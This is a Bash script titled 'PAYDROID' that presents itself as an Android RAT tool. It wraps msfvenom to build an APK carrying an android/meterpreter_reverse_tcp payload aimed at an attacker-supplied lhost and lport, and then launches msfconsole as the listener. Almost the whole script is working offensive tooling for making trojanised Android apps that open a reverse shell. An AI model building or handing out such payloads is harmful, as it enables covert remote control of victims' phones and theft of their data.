#! /usr/bin/bash

# Regular colors
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'

#downloading dependencies
apt-get install lolcat

#clear screen
clear

while true
do
# Logo
echo -e "
██████╗░░█████╗░██╗░░░██╗██████╗░██████╗░░█████╗░██╗██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
██████╔╝███████║░╚████╔╝░██║░░██║██████╔╝██║░░██║██║██║░░██║
██╔═══╝░██╔══██║░░╚██╔╝░░██║░░██║██╔══██╗██║░░██║██║██║░░██║
██║░░░░░██║░░██║░░░██║░░░██████╔╝██║░░██║╚█████╔╝██║██████╔╝
╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝╚═════╝ 
" | lolcat
echo ___________________________________________________________ | lolcat 
echo -e "${WHITE}                     A Android RAT tool by" 
echo -e "                        Anil Shrestha" | lolcat
echo ___________________________________________________________ | lolcat

#Options
echo -e ${WHITE} "
1 ---> Create a payload for Android
2 ---> Start the Multi Handler
3 ---> Exit
"

#Taking Inputs
read -p "Choose your option : " option

if [ $option -eq 1 ]
then 
read -p "Select the Name for the payload : " payloadname
read -p "Select your Lhost : " lhost
read -p "select your Lport : " lport
echo 
echo Creating a payload... ; msfvenom -p android/meterpreter_reverse_tcp lhost=$lhost lport=$lport > $payloadname.apk 
echo Payload saved in ls $PWD/$payloadname.apk
echo "Press enter to continue..." 
read 
clear 
elif [ $option -eq 2 ]
then
echo Starting the Listner. ; msfconsole

clear
elif [ $option -eq 3 ]
then
echo Exiting...
break
else
echo "Invalid option. Please choose a valid option."
read -p "Press any key to continue..."
clear
fi
done





